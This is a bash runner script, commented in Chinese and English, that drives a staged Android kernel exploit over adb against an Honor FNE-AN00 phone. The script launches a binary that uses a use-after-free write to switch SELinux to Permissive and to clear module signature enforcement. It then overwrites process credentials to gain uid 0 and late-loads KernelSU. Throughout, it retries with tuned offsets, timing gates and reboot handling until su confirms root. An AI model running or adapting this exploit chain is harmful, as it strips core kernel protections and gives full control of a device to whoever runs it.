#!/bin/bash
# W2 cred-write runner (macOS-safe: no `timeout`, uses watchdog kills).
# Per boot:
#   1) W1 via --write1 (sync stamp) until SELinux Permissive
#   2) full run (SELinux off -> straight W2, GL_W2_ROUNDS=2)
# Ladder: erase fired (erase_ran=1) but uid stayed 2000 -> cred slot off by
# 8 -> GL_W2_CRED_ADJ=8 on the next boot. Coin-flip miss (no erase_ran) ->
# retry same ADJ after reboot. Success: "child is root!" / KSU ready.
# adb 挂死守护: 设备假死(adbd 挂/USB 不断)时裸 adb shell/wait-for-device
# 会无限阻塞(真机实测 "W2 ROOT ACHIEVED 后卡住" 即此类)。Git Bash 自带
# GNU timeout; macOS 无 coreutils 时退化为原行为。
T30=""; T600=""
command -v timeout >/dev/null 2>&1 && { T30="timeout 30"; T600="timeout 600"; }

# 硬闸门：bash 里看不到 adb 时（典型原因 = run_root.bat 误用了 WSL 的
# C:\Windows\System32\bash.exe，或 platform-tools 不在 PATH），下面每处 adb
# 调用都会 rc=127；settle() 会静默烧掉约 10 分钟，W1 毫秒级"失败"，再由
# run_forever.sh 无限重启 —— 表现就是"卡在 [5/5] 然后超时"。这里立刻停，
# 让 run_forever.sh 看到 127 后停机。
if ! command -v adb >/dev/null 2>&1; then
  echo "FATAL: 'adb' not found on PATH inside this bash."
  echo "       bash   = $(command -v bash || echo bash)"
  echo "       PATH   = $PATH"
  echo "       Fix: run run_root.bat (it prepends the platform-tools directory to"
  echo "       PATH and refuses WSL bash), or use Git Bash with platform-tools on PATH."
  exit 127
fi

# KSU 检测: 最多 2 次, 间隔 5s, 任一次命中即本 boot 已加载 —— 抗 adb 单次
# 瞬断(空响应)的假阴性, 否则会误跑 exploit 触发 slab_drain 保护性重启。
# 与 run_root.command / run_root.bat / uninstall.sh 同规则。
ksu_loaded() {
  local i
  for i in 1 2; do
    $T30 adb shell "grep -q kernelsu /proc/modules" 2>/dev/null && return 0
    [ "$i" -lt 2 ] && sleep 5
  done
  return 1
}

E="/data/local/tmp/e"
# su 是否真的可用（late-load 成功的唯一硬判据；不看 getenforce，也不看
# chain_status —— 它们都可能是别的 boot 留下的）。
verify_su() {
  local out="" i
  for i in 1 2 3 4; do
    out=$($T30 adb shell "su -c id" 2>/dev/null | tr -d '\r')
    case "$out" in
      uid=0*) echo "=== SU OK: $out ==="; return 0 ;;
    esac
    sleep 5
  done
  echo "=== ROOT-NO-KSU: su unusable (last='$out') ==="
  return 1
}
# 8.0.0.202（5.4.289-qgki-gc5b795a0f72f）：第二次 W1 会重跑 slab_drain，fork 风暴
# 触发内核保护性重启（2026-11-10 真机两次复现）。该内核默认只跑 1 次，
# 需要复现时显式 `GL_W1_ATTEMPTS=2 run_w2.sh`。
KREL=$($T30 adb shell uname -r 2>/dev/null | tr -d '\r')
W1_ATTEMPTS=${GL_W1_ATTEMPTS:-2}
case "$KREL" in
  *gc5b795a0f72f*)
    if [ -z "${GL_W1_ATTEMPTS:-}" ]; then W1_ATTEMPTS=1; fi ;;
esac
[ -n "$KREL" ] && echo "[*] kernel: $KREL (GL_W1_ATTEMPTS=$W1_ATTEMPTS)"
SYNC="GL_AIM_DM=1 GL_W1_ATTEMPTS=$W1_ATTEMPTS GL_ROUTE_ATTEMPTS=1 GL_HOLD_CHAIN=1 GL_HOLD_WAITER=1 GL_PUNCH_IN_WINDOW=1 GL_PUNCH_DELAY_USEC=0 GL_MCAST_ROUTE=1 GL_PROBE_BOOTID=0 GL_SPRAY_TEST=0 GL_STAMP_SYNC=1"
# 追加旋钮（2026-11-12）：例如 GL_EXTRA="GL_DRAIN_WAVES=1 GL_DRAIN_BATCH=64"，
# 用来把 W1b 的 fork 风暴压小，避免设备在 sig_enforce 写之前保护性重启。
EXTRA="${GL_EXTRA:-}"

# 2026-11-12 真机结论（FNE-AN00 8.0.0.202 / 5.4.289-gc5b795a0f72f）：
#   sig_enforce 每次开机默认是 Y（不是 N！——23:11 那次能过 gate 1 是赶上已被清掉的
#   boot）。chain_hook 的 gate 1 要求它是 N，而该参数 sysfs 只读，只能用 W1b 的
#   UAF 写清零。所以：W1 阶段先跳过 W1b（只要 Permissive，快且稳），等 Permissive
#   之后**单独串行**补一轮 W1b（见下面 "W1b gate" 段），再起 W2。
#   W1b 每轮先 slab_drain（默认 5 波 x 400 fork），与 W2 并发 = 保护性重启；
#   单独跑时用 GL_DRAIN_WAVES=1 GL_DRAIN_BATCH=64 把风暴压到最小。
#   ⇒ 该内核 W1 阶段默认 GL_SKIP_W1B=1；要强制 W1b 就绪可显式 GL_W1B=1。
SKIP_W1B="${GL_W1B:-0}"
case "$KREL" in
  *gc5b795a0f72f*) [ -z "${GL_W1B:-}" ] && SKIP_W1B=1 ;;
esac
if [ "$SKIP_W1B" = "1" ]; then
  SYNC="$SYNC GL_SKIP_W1B=1"
  echo "[*] W1b skipped (GL_SKIP_W1B=1): sig_enforce is already N on this kernel"
fi

# 跨 boot 残留是假成功的根源（2026-11-12 实测：11-10 的 gl_w2.log 让 driver
# 读到 "child is root!" 而实际 W2 从未启动）。每轮 TRY 开始前清干净。
clean_device_state() {
  $T30 adb shell "rm -f /data/local/tmp/gl_w1.log /data/local/tmp/gl_w2.log \
    /data/local/tmp/ksu_fne/chain_status /data/local/tmp/ksu_fne/chain.log" >/dev/null 2>&1
}

run_to() { # $1=secs $2=logfile $3...=command
  # 实时显示：子进程输出直接写日志文件，本函数按行号增量读取回显。
  # 2026-11-05 修复：旧实现另起 `tail -n +1 -f "$logf" &` 跟随文件，该 tail
  # 继承了外层 stdout —— 在 run_root.command/run_root.bat 下 stdout 就是
  # `| tee` 管道的写端；只要这个 tail 残留（kill 时机与 W1/W2 崩溃、设备
  # 掉线、watchdog 抢占叠加时会发生），管道就永不 EOF，外层 run_forever
  # 卡死、root 成功后三件套不装。改为一次性 tail -n +N，无长命跟随进程。
  local secs=$1 logf=$2; shift 2
  local shown=0 total=0 rc=0
  : > "$logf"
  "$@" >> "$logf" 2>&1 &
  local pid=$!
  # 看门狗：stdout/stderr/stdin 全部脱离（防孤儿持有调用者的 fd），
  # 轮询式而非 `sleep N`，主进程退出后 ≤2s 自行结束。
  ( end=$((SECONDS + secs))
    while kill -0 "$pid" 2>/dev/null && [ "$SECONDS" -lt "$end" ]; do
      sleep 2
    done
    kill "$pid" 2>/dev/null ) >/dev/null 2>&1 </dev/null &
  local wd=$!
  while kill -0 "$pid" 2>/dev/null; do
    total=$(wc -l < "$logf" 2>/dev/null | tr -d ' ')
    case "$total" in ''|*[!0-9]*) total=$shown ;; esac
    if [ "$total" -gt "$shown" ]; then
      tail -n "+$((shown + 1))" "$logf" | head -n $((total - shown))
      shown=$total
    fi
    sleep 1
  done
  wait "$pid" || rc=$?
  # 收尾冲刷：子进程退出瞬间写下的尾部若干行
  total=$(wc -l < "$logf" 2>/dev/null | tr -d ' ')
  case "$total" in ''|*[!0-9]*) total=$shown ;; esac
  if [ "$total" -gt "$shown" ]; then
    tail -n "+$((shown + 1))" "$logf"
  fi
  kill "$wd" 2>/dev/null
  wait "$wd" 2>/dev/null
  return $rc
}

# ---- detached runner (FNE-AN00 8.0.0.202, 2026-11-10) --------------------
# 这台机器上 exploit 的 P3 waiter 设计上要「parking forever」（w1 日志原文：
# "post-walk exit would walk the ghost on a torn-down stack and panic"）。
# 前台 `adb shell "env ... --write1"` 会在 W1 收尾时把该进程连同 adb 会话
# 一起回收 -> 内核走穿被 free 的栈 -> 保护性重启（真机复现两次，w1 rc=255）。
# 因此 W1/W2 一律 nohup 脱离会话后台起、设备端落日志，主机侧增量回显：
#   - 进程留着不杀（它必须活着把 ghost 顶住）；
#   - 等日志安静下来再起 W2，避开「W1b fork 风暴还没跑完就叠 W2」的竞争。
detach_start() { # $1=设备端日志 $2...=设备端命令
  local rlog=$1; shift
  # 2026-11-12: 设备正在自重启/离线时, 下面两条 adb shell 都会静默失败,
  # 旧日志(可能是上一次成功 boot 的)留在设备上, detach_wait 照样把它读回来
  # -> 误报 "child is root!" / "KSU LOADED" 的假成功。这里必须确认:
  #   1) 旧日志已删除; 2) 本轮日志真的被创建。否则返回非 0 让调用方跳过本轮。
  $T30 adb shell "rm -f $rlog" >/dev/null 2>&1
  if $T30 adb shell "test -e $rlog" >/dev/null 2>&1; then
    echo "!! detach_start: stale device log $rlog could not be removed (device busy?)"
    return 1
  fi
  $T30 adb shell "nohup $* > $rlog 2>&1 < /dev/null &" >/dev/null 2>&1
  local di=0
  while [ "$di" -lt 10 ]; do
    if $T30 adb shell "test -f $rlog" >/dev/null 2>&1; then return 0; fi
    di=$((di+1)); sleep 1
  done
  echo "!! detach_start: device log $rlog was not created (launch failed)"
  return 1
}

detach_wait() { # $1=秒 $2=设备端日志 $3=本地日志 $4=安静多久算完成 $5=硬结束标志 ; $6..=成功标志
  local secs=$1 rlog=$2 lf=$3 quiet_need=$4 hard=$5; shift 5
  local shown=0 total quiet=0 hit=0 end=$((SECONDS + secs))
  : > "$lf"
  while [ "$SECONDS" -lt "$end" ]; do
    $T30 adb shell "cat $rlog 2>/dev/null" > "$lf.tmp" 2>/dev/null
    total=$(wc -l < "$lf.tmp" 2>/dev/null | tr -d ' ')
    case "$total" in ''|*[!0-9]*) total=$shown ;; esac
    if [ "$total" -gt "$shown" ]; then
      sed -n "$((shown + 1)),${total}p" "$lf.tmp"
      shown=$total
      quiet=0
    else
      quiet=$((quiet + 1))
    fi
    cp -f "$lf.tmp" "$lf" 2>/dev/null
    hit=0
    if [ -n "$hard" ] && grep -q -- "$hard" "$lf" 2>/dev/null; then
      hit=2
    else
      for pat in "$@"; do
        if grep -q -- "$pat" "$lf" 2>/dev/null; then hit=1; break; fi
      done
    fi
    [ "$hit" = "2" ] && [ "$quiet" -ge 2 ] && break
    [ "$hit" = "1" ] && [ "$quiet" -ge "$quiet_need" ] && break
    sleep 1
  done
  rm -f "$lf.tmp"
  return 0
}

ADJ=0
# Background app storms (photos indexing, searchservice) break W1 timing.
settle() {
  $T30 adb shell "am force-stop com.hihonor.photos" 2>/dev/null
  $T30 adb shell "am force-stop com.hihonor.searchservice" 2>/dev/null
  # 2026-11-10：删掉 `am kill-all` 与 `pm trim-caches`。harness（3/5 成功）只做
  # force-stop + 短等待；这两个动作会在 W1 窗口里制造后台服务重启和页缓存回收，
  # 正好撞上 exploit 的 heap spray / slab_drain —— 实测 run_w2.sh 两次 W1 失败，
  # 其中一次 dm gate 连跑 192 轮找不到合格页。最小静默也从 60s 降到 20s。
  sleep 20 # minimum post-boot quiesce
  # Gate on REAL CPU idle (loadavg is faked by D-state ufs kworkers):
  # sample /proc/stat, require idle delta >= 85% over a 5s window.
  local i=0 a b id
  while [ $i -lt 60 ]; do
    a=$($T30 adb shell "awk '/^cpu /{print \$5+\$6}' /proc/stat" 2>/dev/null | tr -d '\r')
    sleep 5
    b=$($T30 adb shell "awk '/^cpu /{print \$5+\$6}' /proc/stat" 2>/dev/null | tr -d '\r')
    case "$a$b" in ''|*[!0-9]*) sleep 5; i=$((i+1)); continue ;; esac
    # 8 cpus * 5s * 100Hz = 4000 max idle jiffies -> pct = delta/40
    id=$(( (b - a) / 40 ))
    [ "$id" -ge 85 ] 2>/dev/null && { echo "settled: idle=${id}%"; return 0; }
    i=$((i+1))
  done
  echo "settle timeout - proceeding anyway"
}

for try in 1 2 3 4 5 6 7 8; do
  $T600 adb wait-for-device 2>/dev/null; sleep 3
  # 同 boot 已 root 守卫: kernelsu.ko 已加载 = 本 boot 提权已成功
  # (run_root [3/5] 检测被无线 adb 瞬断绕过时由此兜底)。此时再跑 W2 =
  # slab_drain 二次 fork 风暴(2000 fork, main.c:1338) -> 系统保护性
  # 重启(295 用户 18:14 实测)。凭 /proc/modules 判定, 不看 getenforce:
  # "Permissive 但无 KSU"(仅 W1 成)仍需正常重跑 W2。ksu_loaded() 内含
  # 2 次检测(间隔 5s)抗瞬断, 与入口脚本同规则。
  if ksu_loaded; then
    echo "=== KSU READY TRY $try (kernelsu already loaded this boot - skip exploit) ==="
    exit 0
  fi
  settle
  clean_device_state
  # 本 TRY 起始 boot_id: 识别 W1/W2 期间设备是否已自行重启(exploit
  # 崩溃触发保护性重启, rc=255)。已自重启的设备即新鲜 Enforcing 态,
  # 脚本无须再 reboot 一次(295 无线用户实测 w1 rc=255 后二次重启
  # 浪费一轮 + 一次手动 adb connect)。
  boot0=$($T30 adb shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
  en=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r')
  echo "=== TRY $try ADJ=$ADJ $(date +%T) getenforce=$en ==="
  if [ "$en" != "Permissive" ]; then
    echo "--- [W1] 关闭 SELinux (--write1, detached), 最长 420s, TRY $try ---"
    if ! detach_start /data/local/tmp/gl_w1.log env $SYNC $EXTRA $E --write1; then
      echo "TRY $try: W1 launch failed (device busy/offline) - rebooting"
      $T30 adb reboot; sleep 45; $T600 adb wait-for-device; sleep 25
      continue
    fi
    # 与 harness 对齐：一看到 SELinux DISABLED 就往下走，不等 W1b（sig_enforce）
    # 收尾 —— harness 3/5 成功用的就是这条时序；这里若等「安静 20s」会把 W2
    # 推到 W1b 之后，实测两次都在 W1b 的第二次 slab_drain 上 panic。
    detach_wait 420 /data/local/tmp/gl_w1.log "w1_try$try.log" 0 "Write 1 failed" \
      "SELinux DISABLED" "SIG_ENFORCE DISABLED"
    echo "w1 markers: $(grep -E 'SELinux DISABLED|SIG_ENFORCE DISABLED|Write 1 failed' w1_try$try.log | tail -1)"
    # W1 打出 DISABLED 后 adbd/USB 常瞬断, 单次 getenforce 空响应会把
    # 成功误判为失败白白重启(grind_reboot3 实测 10+ try 多次踩中);
    # 改为最多 6 次重试, 仅确认非 Permissive 才判失败。
    gi=0
    while [ $gi -lt 6 ]; do
      en=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r')
      [ "$en" = "Permissive" ] && break
      [ -n "$en" ] && break
      gi=$((gi+1))
      sleep 10
    done
  fi
  if [ "$en" != "Permissive" ]; then
    # boot_id 变了 = 设备在 W1 期间已自行重启, 跳过脚本 reboot, 只等
    # boot 完成。boot1 读不到(设备离线)则回落原行为(reboot 对离线设备
    # 是无害 no-op, wait-for-device 等手动重连/自恢复)。
    boot1=$($T30 adb shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
    if [ -n "$boot1" ] && [ "$boot0" != "$boot1" ]; then
      echo "TRY $try: W1 failed (getenforce=$en) - device self-rebooted during W1, skip extra reboot"
      i=0
      while [ $i -lt 60 ]; do
        bc=$($T30 adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
        [ "$bc" = "1" ] && break
        i=$((i+1)); sleep 5
      done
      sleep 10
    else
      echo "TRY $try: W1 failed (getenforce=$en) - reboot"
      $T30 adb reboot; sleep 45; $T600 adb wait-for-device; sleep 25
    fi
    continue
  fi
  # Permissive now: capture previous boot's panic via pstore/ramoops
  $T30 adb shell "ls /sys/fs/pstore/ 2>/dev/null" > "pstore_try$try.log" 2>&1
  $T30 adb shell "for f in /sys/fs/pstore/*; do echo \"=== \$f\"; cat \"\$f\" 2>/dev/null; done" >> "pstore_try$try.log" 2>&1

  # --- W1b gate: chain_hook 的 gate 1 要求 sig_enforce=N，而该参数是
  # module_param(bool_enable_only, 0444)（sysfs 只读），唯一清零手段就是
  # W1b 的 UAF 写。这台机器每次开机默认是 Y ⇒ 不能无条件跳过 W1b，
  # 否则 W2 拿到 root 也会被 chain 判 sigfail（2026-11-12 23:37 实测）。
  # W1b 必须单独串行跑：和 W2 并发 = 保护性重启。
  sv=$($T30 adb shell "cat /sys/module/module/parameters/sig_enforce 2>/dev/null" 2>/dev/null | tr -d '\r\n')
  echo "TRY $try: sig_enforce=$sv"
  case "$sv" in
    N|0) : ;;
    *)
      echo "TRY $try: running W1b alone to clear sig_enforce"
      $T30 adb shell "rm -f /data/local/tmp/gl_w1b.log" >/dev/null 2>&1
      $T30 adb shell "nohup env $SYNC GL_SKIP_W1B=0 GL_W1B_ATTEMPTS=3 GL_DRAIN_WAVES=1 GL_DRAIN_BATCH=64 $E --write1 > /data/local/tmp/gl_w1b.log 2>&1 < /dev/null &" >/dev/null 2>&1
      w1bi=0
      while [ $w1bi -lt 48 ]; do
        sleep 5; w1bi=$((w1bi+1))
        if $T30 adb shell "grep -q 'SIG_ENFORCE DISABLED' /data/local/tmp/gl_w1b.log" 2>/dev/null; then break; fi
      done
      $T30 adb shell "cat /data/local/tmp/gl_w1b.log" > "w1b_try$try.log" 2>&1
      sv=$($T30 adb shell "cat /sys/module/module/parameters/sig_enforce 2>/dev/null" 2>/dev/null | tr -d '\r\n')
      echo "TRY $try: after W1b sig_enforce=$sv"
      case "$sv" in
        N|0) : ;;
        *) echo "TRY $try: W1b failed to clear sig_enforce - reboot"
           $T30 adb reboot; sleep 45; $T600 adb wait-for-device; sleep 25; continue ;;
      esac
      ;;
  esac
  # Up to 3 W2 invocations on this permissive boot: a clean miss leaves the
  # device permissive (free retry — the 02:48 miss -> 02:52 success path);
  # only a crash (device lost) or success ends the boot early.
# W1 命中后 ghost waiter 已 park，但 adbd/USB 常有瞬断；2026-11-12 真机配方是
# 「等 W1 完全静默 + 再等 20s」才起 W2（15s 时偶发与 W1 收尾重叠）。
  sleep 20
  w2n=0
  w2done=0
  while [ $w2n -lt 3 ]; do
    w2n=$((w2n+1))
    echo "--- [W2] cred 写入 (rounds=2 ADJ=$ADJ), 第 ${w2n}/3 次, 最长 900s ---"
    if ! detach_start /data/local/tmp/gl_w2.log env $SYNC $EXTRA GL_W2_ROUNDS=2 GL_W2_CRED_ADJ=$ADJ $E; then
      echo "W2 launch failed (device busy/offline) - aborting this boot"
      break
    fi
    # W2 命中 "child is root"/KSU 后日志还会再跑 ~25s 的 KSU 链，等它安静 10s 再收。
    detach_wait 900 /data/local/tmp/gl_w2.log "w2_try${try}_${w2n}.log" 10 "" \
      "child is root" "KSU LOADED" "KernelSU helper reports ready" "child uid = 2000" "erase_ran=1"
    echo "w2 attempt $w2n last: $(tail -2 w2_try${try}_${w2n}.log | tr '\n' ' ')"
    if grep -q "child is root" "w2_try${try}_${w2n}.log"; then
      echo "=== W2 ROOT ACHIEVED TRY $try ==="
      # child is root 之后 chain_hook 还要跑 fake kallsyms + insmod（约 20-30s）。
      # 等 chain_status=ok 或 /proc/modules 出现 kernelsu，再用 su -c id 做硬判据。
      # chain_status 跨 boot 会残留（本 TRY 开头已删），所以只看本轮写入的。
      echo "--- waiting for KernelSU late-load (up to 180s) ---"
      ci=0
      while [ "$ci" -lt 36 ]; do
        cs=$($T30 adb shell "cat /data/local/tmp/ksu_fne/chain_status 2>/dev/null" 2>/dev/null | tr -d '\r')
        [ "$cs" = "ok" ] && { echo "--- chain_status=ok ---"; break; }
        if $T30 adb shell "grep -q kernelsu /proc/modules" 2>/dev/null; then
          echo "--- kernelsu present in /proc/modules ---"; break
        fi
        ci=$((ci+1)); sleep 5
      done
      if verify_su; then exit 0; fi
      echo "=== SU MISSING after root (KSU chain did not complete) ==="
      exit 3
    fi
    if grep -qE "KernelSU helper reports ready|KSU LOADED" "w2_try${try}_${w2n}.log"; then
      echo "=== KSU READY TRY $try ==="
      if verify_su; then exit 0; fi
      w2done=1
      break
    fi
    if grep -q "erase_ran=1" "w2_try${try}_${w2n}.log" && grep -q "child uid = 2000" "w2_try${try}_${w2n}.log" && [ "$ADJ" -lt 16 ]; then
      ADJ=$((ADJ+8)); echo "ladder: erase fired, uid 2000 -> ADJ=$ADJ next boot"
    fi
    # Device still permissive (clean miss) -> free retry; otherwise boot lost
    en=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r')
    [ "$en" = "Permissive" ] || break
    echo "W2 clean miss, device still permissive - retrying W2 (attempt $((w2n+1)))"
  done
  [ "$w2done" = "1" ] && break
  # 同 W1: W2 崩溃致设备自重启时跳过冗余 reboot(boot_id 判定)
  boot1=$($T30 adb shell "cat /proc/sys/kernel/random/boot_id" 2>/dev/null | tr -d '\r')
  if [ -n "$boot1" ] && [ "$boot0" != "$boot1" ]; then
    echo "W2 attempts exhausted - device self-rebooted during W2, skip extra reboot"
    i=0
    while [ $i -lt 60 ]; do
      bc=$($T30 adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
      [ "$bc" = "1" ] && break
      i=$((i+1)); sleep 5
    done
    sleep 10
  else
    $T30 adb reboot; sleep 45; $T600 adb wait-for-device; sleep 25
  fi
done
echo "=== FINAL getenforce=$($T30 adb shell getenforce 2>/dev/null | tr -d '\r') kernelsu_modules=$($T30 adb shell 'grep -c kernelsu /proc/modules 2>/dev/null' | tr -d '\r') su=$($T30 adb shell 'su -c id' 2>/dev/null | tr -d '\r') ==="
